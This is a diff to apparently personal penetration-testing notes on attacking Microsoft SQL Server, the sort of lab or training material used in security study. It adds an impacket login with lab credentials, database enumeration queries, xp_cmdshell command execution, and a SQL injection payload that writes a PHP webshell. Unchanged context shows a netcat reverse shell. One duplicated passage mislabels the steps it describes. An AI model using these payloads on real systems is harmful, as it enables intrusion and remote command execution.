@@ -110,11 +110,13 @@ sqsh -S $ip -U .\\<username> -P 'MyPassword!' -h
 
 
 #### mssqlclient.py from impacket 
+We can run impacket-mssqlclient to connect to the remote Windows machine running MSSQL by providing a username, a password, and the remote IP, together with the -windows-auth keyword. This forces NTLM authentication (as opposed to Kerberos).
 
-```shell-session
+```bash
 mssqlclient.py -p $port username@$ip 
-```
 
+#Example: impacket-mssqlclient Administrator:Lab123@192.168.50.18 -windows-auth
+```
 
 If we can guess or gain access to credentials, this allows us to remotely connect to the MSSQL server and start interacting with databases using T-SQL (`Transact-SQL`). Authenticating with MSSQL will enable us to interact directly with databases through the SQL Database Engine. From Pwnbox or a personal attack host, we can use Impacket's mssqlclient.py to connect as seen in the output below. Once connected to the server, it may be good to get a lay of the land and list the databases present on the system.
 
@@ -229,10 +231,26 @@ go
 SELECT is_srvrolemember('sysadmin')
 go
 # If your user is admin, it will return 1.
+
+
+#####################
+# To list all the available databases, we can select all names from the system catalog.
+SELECT name FROM sys.databases;
+
+# We can review this database by querying the tables table in the corresponding information_schema. If we saw offsec as an existing database, this is how we would list tables in that database.
+SELECT * FROM offsec.information_schema.tables;
+
+# Following the example, now we saw the table users (in the database offsec), and we want to see their records:
+select * from offsec.dbo.users;
+
 ```
 
 
 Also, you might be interested in executing a cmd shell using xp_cmdshell by reconfiguring sp_configure (see the section `Executing cmd shell in a SQL command line`).
+
+In Microsoft SQL Server, the [_xp_cmdshell_](https://docs.microsoft.com/en-us/sql/relational-databases/system-stored-procedures/xp-cmdshell-transact-sql?view=sql-server-ver15) function takes a string and passes it to a command shell for execution. The function returns any output as rows of text. The function is disabled by default and once enabled, it must be called with the **EXECUTE** keyword instead of SELECT.
+
+
 
 ### Write files using MSSQL
 To write files using MSSQL, we need to enable Ole Automation Procedures, which requires admin privileges, and then execute some stored procedures to create the file:
@@ -242,6 +260,32 @@ sp_configure 'show advanced options', 1;
 RECONFIGURE;
 sp_configure 'Ole Automation Procedures', 1;
 RECONFIGURE;
+```
+
+After logging in from our Kali VM to the MSSQL instance, we can enable _show advanced options_ by setting its value to 1, then applying the changes to the running configuration via the **RECONFIGURE** statement. Next, we'll enable _xp_cmdshell_ and apply the configuration again using **RECONFIGURE**.
+
+With this feature enabled, we can execute any Windows shell command through the **EXECUTE** statement followed by the feature name.
+
+```sql
+EXECUTE xp_cmdshell 'whoami';
+```
+
+Although the various MySQL database variants don't offer a single function to escalate to RCE, we _can_ abuse the [_SELECT INTO_OUTFILE_](https://dev.mysql.com/doc/refman/8.0/en/select-into.html) statement to write files on the web server. For this attack to work, the file location must be writable to the OS user running the database software. Example:
+
+```
+' UNION SELECT "<?php system($_GET['cmd']);?>", null, null, null, null INTO OUTFILE "/var/www/html/tmp/webshell.php" -- //
+```
+
+The written PHP code file results in the following:
+
+```php
+<? system($_REQUEST['cmd']); ?>
+```
+
+To trigger it, go to:
+
+```text
+http://$ip/tmp/webshell.php?cmd=id
 ```
 
 ### Create files using MSSQL
@@ -317,3 +361,24 @@ xp_cmdshell "powershell -c cd C:\Users\sql_svc\Downloads; .\nc64.exe -e cmd.exe 
 ```
 
 There are other methods to get command execution, such as adding [extended stored procedures](https://docs.microsoft.com/en-us/sql/relational-databases/extended-stored-procedures-programming/adding-an-extended-stored-procedure-to-sql-server), [CLR Assemblies](https://docs.microsoft.com/en-us/dotnet/framework/data/adonet/sql/introduction-to-sql-server-clr-integration), [SQL Server Agent Jobs](https://docs.microsoft.com/en-us/sql/ssms/agent/schedule-a-job?view=sql-server-ver15), and [external scripts](https://docs.microsoft.com/en-us/sql/relational-databases/system-stored-procedures/sp-execute-external-script-transact-sql).
+
+
+**Another approach:**
+
+To write files using MSSQL, we need to enable Ole Automation Procedures, which requires admin privileges, and then execute some stored procedures to create the file:
+
+```cmd-session
+sp_configure 'show advanced options', 1;
+RECONFIGURE;
+sp_configure 'Ole Automation Procedures', 1;
+RECONFIGURE;
+```
+
+After logging in from our Kali VM to the MSSQL instance, we can enable _show advanced options_ by setting its value to 1, then applying the changes to the running configuration via the **RECONFIGURE** statement. Next, we'll enable _xp_cmdshell_ and apply the configuration again using **RECONFIGURE**.
+
+With this feature enabled, we can execute any Windows shell command through the **EXECUTE** statement followed by the feature name.
+
+```sql
+EXECUTE xp_cmdshell 'whoami';
+```
+
